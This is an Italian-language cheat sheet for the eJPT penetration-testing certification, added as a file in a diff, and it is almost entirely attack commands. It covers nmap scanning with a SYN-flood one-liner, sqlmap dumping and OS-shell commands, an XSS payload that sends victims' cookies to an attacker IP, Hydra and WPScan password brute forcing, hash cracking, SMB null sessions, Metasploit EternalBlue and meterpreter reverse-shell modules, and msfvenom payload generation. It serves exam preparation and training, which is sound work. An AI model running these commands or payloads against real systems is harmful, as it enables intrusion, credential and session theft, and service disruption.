@@ -1,0 +1,312 @@
+EJPT Cheat Sheet
+
+----------------------------SCANNING & FOOTPRINT----------------------------
+
+NMAP
+
+Discovery/Ping Sweep
+nmap -sn <IP/n>
+
+Open port
+-sS stealth
+-Pn no ping
+-Tn (0<=n<=4) velocità di scansionamento
+--open fa vedere solo porte aperte
+-oN porte da un file
+-iL scrive su un file
+-sT connessione alle porte
+-p- tutte le porte
+-p n scansiona solo quella porta
+-A Os detection
+-sU scan UDP
+-sV Versione servizio
+-O OS information
+
+SYN flood esempio
+watch -n 10 "nmap -e wlan0 -Pn -T5 -S 192.168.0.253 192.168.0.251"
+
+Firewall
+Se una scansione TCP nmap ha identificato un servizio noto, 
+ad esempio un server Web, ma non è in grado di rilevare la versione, è possibile che sia presente un firewall.
+
+PORT    STATE  SERVICE  REASON          VERSION
+80/tcp  open   http?    syn-ack ttl 64
+
+oppure
+
+80/tcp  open   tcpwrapped 
+
+Posso sempre vedere quello che accade con --reason
+
+FPING Ping Sweep
+
+fping -a -g <subnet/n> 2>/dev/null
+
+----------------------------WEB SERVER FROINGERPRINT----------------------------
+
+No TLS/HTTPS
+nc <targetIP> nport
+HEAD / HTTP/1.1 
+
+Si TLS/HTTPS
+openssl s_client -connect target.site:443
+HEAD / HTTP/1.1
+
+httprint -P0 -s /usr/share/httprint/signatures.txt -h <IP>
+
+Caricare un file tramite HTTP
+wc -m shell.php
+x shell.php
+
+PUT /shell.php
+Content-type: text/html
+Content-length: x
+
+----------------------------SUBDOMAINS ENUMERATION----------------------------
+
+sublist3r -d site.com
+
+https://dnsdumpster.com/
+
+----------------------------WEBAPP ENUMERATION----------------------------
+
+Fuzzing directory
+
+gobuster dir -u http://<site> -w /usr/share/wordlists/lsit
+dirbuster (ha GUI)
+dirb
+ffuf -w wordlist.txt -u http://<site>/FUZZ
+
+Fuzzing file
+
+gobuster dir -u http://<site> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o output.txt
+ffuf -w wordlist.txt -u http://<site>/FUZZ -e .aspx,.php,.txt,.html
+
+Filtrare attraverso risposta
+ffuf -w /usr/share/wordlists/dirb/small.txt -u http://<site>/FUZZ -mc 200,301
+
+Threads
+gobuster dir -u http://<site> -w /usr/share/wordlists/lsit -t 10
+ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
+
+----------------------------EXPLOITATION WEB APP----------------------------
+
+SQL INJETION
+Find
+Union Based: ' or '1'= '1	' or 1=1;-- -
+Error Based: ' and 1=1		' and 1=2
+Time based: SLEEP(10)
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet?msclkid=2c766ab6cecf11ecac7f06401146165b
+
+Sqlmap
+GET
+sqlmap -u http://site.com/?id=1 -p parameter  #check
+sqlmap -u http://site.com/?id=1 -p parameter --dbs #tipo db
+sqlmap -u http://site.com/?id=1 -p parameter -D dbname #se si conosce già il tipo di db
+sqlmap -u http://site.com/?id=1 -p parameter -D dbname --tables #trova tutte le tabelle
+sqlmap -u http://site.com/?id=1 -p parameter -D dbname -T tabella1,tabella2 --dump #dati dalle tabelle
+sqlmap -u http://site.com/?id=1 -p parameter -D dbname --common-tables --dump #trova le tabelle con i nomi comuni
+sqlmap -u http://site.com/?id=1 -p parameter -D dbname --os-shell/--sql-shell #spwan a shell
+
+POST
+sqlmap -u http://site.com --data="dati1=0&dato2=0" -p dati1 #check
+sqlmap -u http://site.com --data="dati1=0&dato2=0" --dbs #tipo db
+sqlmap -u http://site.com --data="dati1=0&dato2=0" -D dbname #se si conosce già il tipo di db
+sqlmap -u http://site.com --data="dati1=0&dato2=0" -D dbname --tables #trova tutte le tabelle
+sqlmap -u http://site.com --data="dati1=0&dato2=0" -D dbname -T tabella1,tabella2 --dump #dati dalle tabelle
+sqlmap -u http://site.com --data="dati1=0&dato2=0" -D dbname --common-tables --dump #trova le tabelle con i nomi comuni
+sqlmap -u http://site.com --data="dati1=0&dato2=0" -D dbname --os-shell/--sql-shell #spwan a shell
+
+XSS
+tipi
+ - Reflected: il payload si trova sulla riposta
+ - Sotred: il payload è permanete all'intero della riposta
+ - DOM: si trova all'intenro del DOM
+
+Possibilità di trovarli all'interno di:
+ - Request headers
+ - Cookies
+ - Form inputs
+ - POST parameters
+ - GET parameters
+
+Esempio:
+	<script>alert("XSS")</script>
+
+Rubare i cookie
+
+ - Lato sito:
+	<script>var i = new Image();i.src="http://192.168.99.102/?q="+document.cookie;</script>
+
+ - Lato attaccante:
+	nc -vv -k -l -p 80
+
+BRUTE FORCE
+
+Hydra 
+http auth brute
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/
+
+http get method
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/
+
+http post from
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
+
+http auth post from
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
+
+Wordpress
+wpscan --url http://10.10.10.14 --enumerate u #enumerazione
+wpscan --url example.com -e vp --plugins-detection mixed --api-token API_TOKEN #plugin
+wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt #bruteforce password
+wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt #bruteforce password admin
+
+----------------------------PAYLOAD----------------------------
+https://github.com/swisskyrepo/PayloadsAllTheThings?msclkid=5683eb34cedf11ec8d834b1016e7f338
+
+----------------------------MySQL Database commands----------------------------
+Login MySQL
+Remotrly
+mysql --user=<user> -p <pass> --port=13306 -h 172.16.64.81 -D <dbname>
+
+Locally
+mysql -u <user> -p <pass>
+
+Commands
+> SHOW databases;
+> SHOW tables FROM databases;
+> USE database;
+> SELECT * FROM table;
+
+Cambiare valori all'interno dei campi
+# Add the user tracking1 to the "adm" group
+> update users set adm="yes" where username="tracking1";
+
+----------------------------NETWORK ATTACK----------------------------
+BRUTE FORCE
+
+cewl
+cewl example.com -m 3 -w wordlist.txt #creazione wordlist
+
+Hydra
+
+hydra -f -v -V -L users.txt -P rockyou-15.txt -s 2223 -f ssh://<IP> #con user file
+hydra -v -V -l admin -P rockyou-10.txt ssh://<IP> #user specifico
+
+Jhon the ripper
+
+Conbine shadow to passwd
+unshadow passwd shadow > crack.hash
+
+Crack the combine file
+john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
+john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash
+
+Cracking with Hashcat
+hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
+
+NULL SESSION
+NMBLOOKUP -A <IP>
+smbclient -L //<IP> -N share #enumerate share, guarda se siste <20> che vuol dire che è accessibile
+smbclient //<IP>/share -N mount #boh
+
+ENUMERAZIONE
+enum4linux -a <IP>
+
+----------------------------MSFCONSOLE----------------------------
+
+Start
+msfconsole start
+
+Search
+search <exploit/auxilliary>
+search cve:2011 port:135 platform:windows target:XP
+
+Basic
+msfconsole
+use auxiliary/scanner/mssql/mssql_login
+set rhosts 10.10.10.110
+set rports 1433
+set username admin
+set password 12345
+set verbose true
+run
+
+mssql payload
+
+use exploit/windows/mssql/mssql_payload
+set rhosts 10.10.10.177
+set rport 1433
+set srvport 53
+set username admin
+set password qwerty
+set payload windows/x64/meterpreter_reverse_tcp
+ssh login enumeration (bruteforce)
+
+use auxiliary/scanner/ssh/ssh_login
+show options
+set rhosts 10.10.10.133
+set user_file /usr/share/ncrack/minimal.usr
+set pass_file /usr/share/ncrack/minimal.usr
+set verbose true
+run
+eternal blue x86 architecture example:
+
+use exploit/windows/smb/ms17_010_psexec
+show options
+eternal blue x64 architecture example:
+
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set payload windows/x64/meterpreter/reverse_tcp
+
+----------------------------MSFVENOM----------------------------
+Aggiungere una route che normalmente non possiamo raggiungere
+
+Porcedimento per un dynamic port forward (per scansioni)
+sulla meterpreter
+run autoroute -s <subnet> -n <netmask> #aggiungere una subnet all'interno del database di metasploit
+route print
+route add 192.69.228.0 255.255.255.0 1 #dove add immette una nuova route subnet netmask idsessione
+
+Local port forwarding
+portfwd add -l <porta locale> -p <porta remota> -r <host sull'altra porzione di rete>
+Se vogliamo scansione quella porta possiamo analizzare la nostra porta con nmap
+nmap -sS -sV -p 1234 localhost
+
+Caricare una shell
+1. Trovare trovare una vulnerabilità come LFI/RFI
+2. usare listener di metasploit
+
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp # or any payload you wish
+set lhost <MY IP>
+set lport <PORT>  # set to a port open on the target to bypass firewall
+run
+
+3. Creare una reverseshell con meterpeter
+
+Linux
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<my IP> lport=<port> -f elf -o meter >shell.elf
+
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my IP> LPORT=<port> -f exe > shell.exe
+
+4. Iniettare il codice
+
+https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/?msclkid=e7f63e85cedf11ecbbb9b9bc76992da9
+
+PHP reverse shell
+https://pentestmonkey.net/tools/web-shells/php-reverse-shell?msclkid=3d27e438cee011ecbba3198d4d8e54b3
+
+GTFOBins
+https://gtfobins.github.io/
+
+----------------------------AGGIUNGERE UN VHOST----------------------------
+$ sudo vim /etc/hosts
+<IP addr>	static.foobar.org
+
+----------------------------ROUTING----------------------------
+ip route add <subnet/n> via <VPN Gateway>
